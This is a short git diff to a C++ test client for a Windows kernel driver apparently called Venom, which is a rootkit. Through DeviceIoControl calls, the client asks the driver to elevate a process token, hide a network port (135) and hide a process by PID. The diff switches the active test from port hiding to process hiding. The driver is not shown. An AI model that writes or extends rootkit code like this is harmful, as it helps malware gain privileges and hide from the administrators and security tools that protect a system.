@@ -18,14 +18,24 @@ int main(int argc, const char* argv[]) {
 		return 1;
 	}
 
+	// Check token elevation
 	/*ULONG PID = 5048;
 	std::cout << "The pid is: " << PID;
 	DWORD returned = 0;
 	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::Elevate, &PID, sizeof(PID), nullptr, 0, &returned, nullptr);*/
-	USHORT PORT = 135;
+
+	// Check port hiding
+	/*USHORT PORT = 135;
 	std::cout << "The port is: " << PORT << endl;
 	DWORD returned = 0;
-	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HidePort, &PORT, sizeof(PORT), nullptr, 0, &returned, nullptr);
+	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HidePort, &PORT, sizeof(PORT), nullptr, 0, &returned, nullptr);*/
+
+	// Check Process Hiding
+	ULONG PID = 2640;
+	std::cout << "The pid is: " << PID;
+	DWORD returned = 0;
+	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::HideProcces, &PID, sizeof(PID), nullptr, 0, &returned, nullptr);
+
 	if (success)
 	{
 		cout << "YAY" << endl;
